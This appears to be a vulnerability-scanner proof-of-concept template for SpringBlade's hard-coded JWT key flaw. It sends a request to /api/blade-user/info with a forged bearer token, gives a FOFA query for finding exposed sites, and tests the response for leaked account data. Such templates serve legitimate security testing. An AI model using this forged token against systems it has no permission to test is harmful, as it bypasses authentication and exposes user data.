id: poc-yaml-springblade-info-hard-coded-key
info:
  name: SpringBlade info 硬编码密钥漏洞
  severity: high
  tags:
  - 硬编码凭据
  finger: springblade
  fofa: body="https://bladex.vip"
requests:
- method: GET
  path: /api/blade-user/info
  headers:
    Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ
  expression: status_code == 200 && contains(body,"\"success\":true") && matches(body,"\"name\":\"[\u4e00-\u9fa5]+\"")
    && matches(body,"\"account\":\"[0-9a-zA-Z]+\"") && contains(headers,"application/json")
variables: {}
transport: http
